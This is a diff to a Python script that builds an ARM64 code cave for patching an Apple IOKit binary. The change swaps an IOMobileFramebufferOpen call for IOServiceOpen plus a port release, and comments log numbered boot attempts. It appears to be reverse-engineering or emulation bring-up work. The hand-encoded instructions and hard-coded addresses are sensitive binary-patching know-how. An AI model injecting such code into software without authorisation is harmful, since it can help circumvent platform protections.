@@ -35,7 +35,10 @@ GMS_SINGULAR = 0x22C6CE7D0  # IOServiceGetMatchingService
 GMS_PLURAL = 0x22C6CE7E0  # IOServiceGetMatchingServices
 NEXT = 0x22C6CE6E0  # IOIteratorNext
 REL = 0x22C6CE740  # IOObjectRelease
-OPEN = 0x2288059E0
+# boot123: IOMobileFramebufferOpen (0x2288059e0) never reached kernel IOSOPEN
+# after a valid Next — try IOServiceOpen directly to prove the port path.
+IOSOPEN = 0x22C6CE800
+OPEN = 0x2288059E0  # kept for reference / future wrap
 # Master port GOT slot used by GetMatchingService callers (d50, not d48).
 MASTER_ADRP, MASTER_OFF = 0x277B6A000, 0xD50
 TASK_ADRP, TASK_OFF = 0x277C1E000, 0xCF8
@@ -131,13 +134,21 @@ def build_cave() -> list[int]:
     cbz3 = len(code)
     emit(0)  # cbz w22 → fail
 
+    # IOServiceOpen(service, task, type, io_connect_t *connect)
+    # Use *out as the connect out-param (FDR expects an IOMFB object later;
+    # boot124 first proves IOSOPEN with the raw connect port).
     emit(enc_adrp(8, pc, TASK_ADRP))
     emit(enc_ldr_x(8, 8, TASK_OFF))
     emit(enc_ldr_w(1, 8, 0))  # task
+    emit(0xAA1603E0)  # mov x0, x22  (service)
+    emit(0x52800002)  # movz w2, #0  (type)
+    emit(0xAA1303E3)  # mov x3, x19  (&connect)
+    emit(enc_bl(pc, IOSOPEN))
+    # Release the service port we own from Next (Open retains if needed).
+    emit(0xAA0003F4)  # mov x20, x0  (kr)
     emit(0xAA1603E0)  # mov x0, x22
-    emit(0x52800002)  # movz w2, #0
-    emit(0xAA1303E3)  # mov x3, x19
-    emit(enc_bl(pc, OPEN))
+    emit(enc_bl(pc, REL))
+    emit(0xAA1403E0)  # mov x0, x20
     epi = pc
     emit(0xA9447BFD)
     emit(0xA9434FF4)
